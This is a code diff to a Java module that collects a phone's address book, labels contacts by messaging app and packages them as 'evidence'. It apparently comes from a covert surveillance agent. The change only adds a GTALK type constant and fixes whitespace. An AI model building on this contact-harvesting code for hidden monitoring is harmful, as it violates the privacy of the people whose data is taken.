@@ -44,6 +44,7 @@ public class ModuleAddressBook extends BaseModule implements Observer<Sim> {
 	public static final int WHATSAPP = 0x07;
 	public static final int FACEBOOK = 0x03;
 	public static final int SKYPE = 0x02;
+	public static final int GTALK = 0x05;
 	public static final int VIBER = 0x0b;
 	public static final int WECHAT = 0x0c;
 	public static final int LOCAL = 0x80000000;
@@ -75,7 +76,7 @@ public class ModuleAddressBook extends BaseModule implements Observer<Sim> {
 		ListenerSim.self().attach(this);
 
 		markupContacts = new Markup(this);
-		//markupContacts.unserialize()
+		// markupContacts.unserialize()
 
 		// the markup exists, try to read it
 		if (markupContacts.isMarkup()) {
@@ -201,7 +202,7 @@ public class ModuleAddressBook extends BaseModule implements Observer<Sim> {
 
 		final Date before = new Date();
 		final Hashtable<Long, Contact> contacts = contact.getContactInfo();
-		
+
 		final Date after = new Date();
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (go): get contact time s " + (after.getTime() - before.getTime()) / 1000);//$NON-NLS-1$
@@ -210,7 +211,6 @@ public class ModuleAddressBook extends BaseModule implements Observer<Sim> {
 			Check.log(TAG + " (go): list size = " + contacts.size());//$NON-NLS-1$
 		}
 
-		
 		final Iterator<Contact> iter = contacts.values().iterator();
 
 		boolean needToSerialize = false;
@@ -251,7 +251,7 @@ public class ModuleAddressBook extends BaseModule implements Observer<Sim> {
 			}
 			contacts.put(id, crcNew);
 			needToSerialize = true;
-			//Thread.yield();
+			// Thread.yield();
 		}
 		return needToSerialize;
 	}
@@ -296,7 +296,7 @@ public class ModuleAddressBook extends BaseModule implements Observer<Sim> {
 		addTypedString(outputStream, (byte) 0x37, message);
 
 		addTypedString(outputStream, (byte) 0x40, number);
-		
+
 		final byte[] payload = outputStream.toByteArray();
 
 		final int size = payload.length;
@@ -376,7 +376,7 @@ public class ModuleAddressBook extends BaseModule implements Observer<Sim> {
 
 		return 0;
 	}
-	
+
 	public static void createEvidenceLocal(int evId, String data) {
 		createEvidenceLocal(evId, data, null);
 	}
